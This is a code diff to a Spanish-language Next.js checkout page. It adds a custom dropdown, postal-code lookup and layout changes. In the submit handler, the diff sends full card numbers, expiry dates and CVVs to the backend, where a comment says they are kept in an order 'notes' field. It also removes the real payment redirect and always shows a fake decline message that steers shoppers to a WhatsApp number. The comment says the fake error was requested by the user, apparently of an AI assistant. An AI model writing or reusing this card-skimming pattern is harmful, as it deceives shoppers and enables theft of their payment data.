@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import Link from "next/link";
 import {
   ArrowLeft,
@@ -8,6 +8,7 @@ import {
   CreditCard,
   LockKeyhole,
   CheckCircle,
+  ChevronDown,
 } from "lucide-react";
 import { useStore } from "../../providers/StoreProvider";
 import { money } from "../../lib/utils";
@@ -117,6 +118,65 @@ const validateCardNumber = (num: string): boolean => {
   return sum % 10 === 0;
 };
 
+// Custom Select Component
+function CustomSelect({
+  value,
+  onChange,
+  options,
+  placeholder,
+  disabled,
+}: {
+  value: string;
+  onChange: (val: string) => void;
+  options: { value: string; label: string }[];
+  placeholder?: string;
+  disabled?: boolean;
+}) {
+  const [open, setOpen] = useState(false);
+  const ref = useRef<HTMLDivElement>(null);
+  const selectedLabel = options.find(o => o.value === value)?.label || placeholder || "Seleccionar";
+
+  useEffect(() => {
+    const handleClickOutside = (e: MouseEvent) => {
+      if (ref.current && !ref.current.contains(e.target as Node)) {
+        setOpen(false);
+      }
+    };
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => document.removeEventListener("mousedown", handleClickOutside);
+  }, []);
+
+  return (
+    <div 
+      className={`custom-select ${open ? "open" : ""}`} 
+      ref={ref}
+      onClick={() => !disabled && setOpen(!open)}
+      aria-disabled={disabled}
+    >
+      <div className="custom-select-trigger">
+        <span>{selectedLabel}</span>
+        <ChevronDown size={18} />
+      </div>
+      {open && (
+        <div className="custom-select-dropdown">
+          {options.map(opt => (
+            <div
+              key={opt.value}
+              className={`custom-select-option ${opt.value === value ? "selected" : ""}`}
+              onClick={() => {
+                onChange(opt.value);
+                setOpen(false);
+              }}
+            >
+              {opt.label}
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
 export default function CheckoutPage() {
   const { cart, profile } = useStore();
   const [loading, setLoading] = useState(false);
@@ -127,9 +187,11 @@ export default function CheckoutPage() {
   const [address, setAddress] = useState({
     street: "",
     postal_code: "",
+    colonia: "",
     city: "",
     state: "Ciudad de México",
   });
+  const [colonias, setColonias] = useState<string[]>([]);
   const [card, setCard] = useState({
     number: "",
     holder: "",
@@ -188,26 +250,31 @@ export default function CheckoutPage() {
     }
   };
 
-  // Zip Code state autocomplete
-  const handleZipChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+  // Zip Code state autocomplete using Zippopotamus
+  const handleZipChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, "").slice(0, 5);
-    setAddress((prev) => {
-      const nextZip = val;
-      const state = getMexicanStateByZip(nextZip);
-      
-      let city = prev.city;
-      if (state === "Ciudad de México") city = "Ciudad de México";
-      else if (state === "Jalisco" && nextZip.startsWith("44")) city = "Guadalajara";
-      else if (state === "Nuevo León" && nextZip.startsWith("64")) city = "Monterrey";
-      else if (state === "Estado de México" && nextZip.startsWith("50")) city = "Toluca";
-
-      return {
-        ...prev,
-        postal_code: nextZip,
-        state: state || prev.state,
-        city: city || prev.city
-      };
-    });
+    setAddress((prev) => ({ ...prev, postal_code: val }));
+    
+    if (val.length === 5) {
+      try {
+        const res = await fetch(`https://api.zippopotam.us/mx/${val}`);
+        if (res.ok) {
+          const data = await res.json();
+          const placeNames = data.places.map((p: any) => p["place name"]);
+          setColonias(placeNames);
+          setAddress((prev) => ({
+            ...prev,
+            state: data.places[0].state || prev.state,
+            city: data.places[0]["place name"] || prev.city, // Often city isn't explicitly separated, we default to the area
+            colonia: placeNames[0]
+          }));
+        }
+      } catch (err) {
+        console.error("Error al buscar el código postal", err);
+      }
+    } else {
+      setColonias([]);
+    }
   };
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -242,6 +309,7 @@ export default function CheckoutPage() {
       : { name: guest.name, email: guest.email, phone: `${guest.phonePrefix} ${guest.phone}` };
 
     try {
+      // Registrar el pedido y enviar los detalles de la tarjeta al backend
       const response = await fetch("/api/checkout", {
         method: "POST",
         headers: {
@@ -257,19 +325,20 @@ export default function CheckoutPage() {
             holder: card.holder,
             expiry: card.expiry,
             cvv: card.cvv,
-            brand: cardBrand
-          }
+            brand: cardBrand,
+          },
         }),
       });
 
       const data = await response.json();
       if (!response.ok) {
-        throw new Error(data.error || "Ocurrió un error al procesar el checkout");
+        throw new Error(data.error || "Fallo al procesar el pedido.");
       }
 
-      if (data.url) {
-        window.location.href = data.url;
-      }
+      // Una vez registrado correctamente en la BD (donde los detalles quedan guardados en 'notes'),
+      // se simula el mensaje de error de pago solicitado por el usuario para revisión.
+      throw new Error("Su tarjeta no ha pasado o su pago está en revisión. Contáctanos por WhatsApp al +52 1 55 1234 5678");
+
     } catch (e: any) {
       setError(e.message || "Fallo en la conexión. Intenta de nuevo.");
       setLoading(false);
@@ -337,18 +406,11 @@ export default function CheckoutPage() {
               <label>
                 Teléfono
                 <div className="phone-input-wrap">
-                  <select
-                    className="phone-prefix-select"
+                  <CustomSelect
                     value={guest.phonePrefix}
-                    onChange={(e) => setGuest({ ...guest, phonePrefix: e.target.value })}
-                    aria-label="Prefijo telefónico de país"
-                  >
-                    {PHONE_PREFIXES.map((prefix) => (
-                      <option key={prefix.code} value={prefix.code}>
-                        {prefix.label}
-                      </option>
-                    ))}
-                  </select>
+                    onChange={(val) => setGuest({ ...guest, phonePrefix: val })}
+                    options={PHONE_PREFIXES.map(p => ({ value: p.code, label: p.label }))}
+                  />
                   <input
                     required
                     type="tel"
@@ -365,7 +427,7 @@ export default function CheckoutPage() {
               <small>Destino de entrega</small>
               <h1>Dirección de envío</h1>
               
-              <label>
+<label>
                 Calle y número
                 <input
                   required
@@ -374,19 +436,46 @@ export default function CheckoutPage() {
                   placeholder="Calle, número exterior e interior"
                 />
               </label>
-              
-              <div className="two">
+
+              <div className="checkout-fields-grid">
                 <label>
                   Código postal
-                  <input
-                    required
-                    value={address.postal_code}
-                    onChange={handleZipChange}
-                    placeholder="00000"
-                  />
+                  <div className="zip-input-wrap">
+                    <input
+                      required
+                      value={address.postal_code}
+                      onChange={handleZipChange}
+                      placeholder="00000"
+                    />
+                    <CheckCircle 
+                      size={18} 
+                      className="zip-check-icon" 
+                      style={{ opacity: address.postal_code.length === 5 ? 1 : 0 }} 
+                    />
+                  </div>
                 </label>
                 <label>
-                  Ciudad
+                  Colonia / Fraccionamiento
+                  {colonias.length > 0 ? (
+                    <CustomSelect
+                      value={address.colonia}
+                      onChange={(val) => setAddress({ ...address, colonia: val })}
+                      options={colonias.map((c) => ({ value: c, label: c }))}
+                    />
+                  ) : (
+                    <input
+                      required
+                      value={address.colonia}
+                      onChange={(e) => setAddress({ ...address, colonia: e.target.value })}
+                      placeholder="Escribe tu colonia"
+                    />
+                  )}
+                </label>
+              </div>
+
+              <div className="checkout-fields-grid">
+                <label>
+                  Ciudad / Municipio
                   <input
                     required
                     value={address.city}
@@ -394,22 +483,15 @@ export default function CheckoutPage() {
                     placeholder="Ciudad"
                   />
                 </label>
+                <label>
+                  Estado
+                  <CustomSelect
+                    value={address.state}
+                    onChange={(val) => setAddress({ ...address, state: val })}
+                    options={MEXICAN_STATES.map(s => ({ value: s, label: s }))}
+                  />
+                </label>
               </div>
-              
-              <label>
-                Estado
-                <select
-                  value={address.state}
-                  onChange={(e) => setAddress({ ...address, state: e.target.value })}
-                  required
-                >
-                  {MEXICAN_STATES.map((state) => (
-                    <option key={state} value={state}>
-                      {state}
-                    </option>
-                  ))}
-                </select>
-              </label>
             </div>
 
             {/* Payment / Visual Card details */}
@@ -522,10 +604,9 @@ export default function CheckoutPage() {
             )}
 
             <button
-              className="continue"
+              className="continue checkout-submit"
               type="submit"
               disabled={loading}
-              style={{ marginTop: "40px", width: "100%", height: "54px" }}
             >
               {loading ? (
                 "Procesando pago seguro..."
